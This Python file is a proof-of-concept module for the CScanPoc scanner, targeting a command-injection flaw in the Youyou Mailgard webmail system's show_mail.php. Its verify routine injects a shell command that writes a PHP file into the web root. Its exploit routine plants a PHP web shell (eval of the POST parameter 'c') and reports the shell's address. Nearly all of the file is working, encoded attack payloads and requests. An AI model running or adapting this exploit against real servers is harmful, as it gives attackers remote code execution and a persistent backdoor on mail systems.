# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Mailgard_0012_L'  # 平台漏洞编号，留空
    name = '佑友mailgard webmail邮件系统getshell'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-06-08'  # 漏洞公布时间
    desc = '''
        show_mail.php: 参数未过滤导致命令执行。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/3211/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Mailgard'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '836aadeb-471e-4ca1-b7e7-6f2310eb2e17'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-21'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 首先注册用户，登录用户。
            # 获取cookies
            cookies = {}
            '''
            raw_cookies = 'bid=xxxxx;_pk_ref.100001.8cb4=xxxxxxx;__utma=xxxxx'
            for line in raw_cookies.split(';'):  
                key,value=line.split('=',1)#1代表只分一次，得到两个数据  
                cookies[key]=value 
            '''
            # aaaa: & echo '<?php phpinfo()?>' > /var/www/newmail/ccc.php&delMove=move&toBoxName=yyy
            payload = "/src/show_mail.php?sd=aaaa%253A%2520%2526%2520echo%2520%2527%253C%253Fphp%2520phpinfo%2528%2529%253F%253E%2527%2520%253E%2520%252fvar%252fwww%252fnewmail%252fccc.php&delMove=move&toBoxName=yyy"
            requests.get(self.target + payload, cookies=cookies)
            verify_url = self.target + '/ccc.php'
            r = requests.get(verify_url)

            if 'PHP Version' in r.text and 'System' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=verify_url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 首先注册用户，登录用户。
            # 获取cookies
            cookies = {}
            '''
            raw_cookies = 'bid=xxxxx;_pk_ref.100001.8cb4=xxxxxxx;__utma=xxxxx'
            for line in raw_cookies.split(';'):  
                key,value=line.split('=',1)#1代表只分一次，得到两个数据  
                cookies[key]=value 
            '''
            # echo '<?php phpinfo();eval($_POST[c])?>'
            payload = "/src/show_mail.php?sd=aaaa%253A%2520%2526%2520echo%2520%2527%253C%253Fphp%2520phpinfo%2528%2529%253Beval(%2524_POST%255Bc%255D)%253F%253E%2527%2520%253E%2520%252fvar%252fwww%252fnewmail%252fccc.php&delMove=move&toBoxName=yyy"
            requests.get(self.target + payload, cookies=cookies)
            verify_url = self.target + '/ccc.php'
            r = requests.get(verify_url)

            if 'PHP Version' in r.text and 'System' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，已上传webshell地址:{url}密码为c,请及时删除。'.format(
                    target=self.target, name=self.vuln.name, url=verify_url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
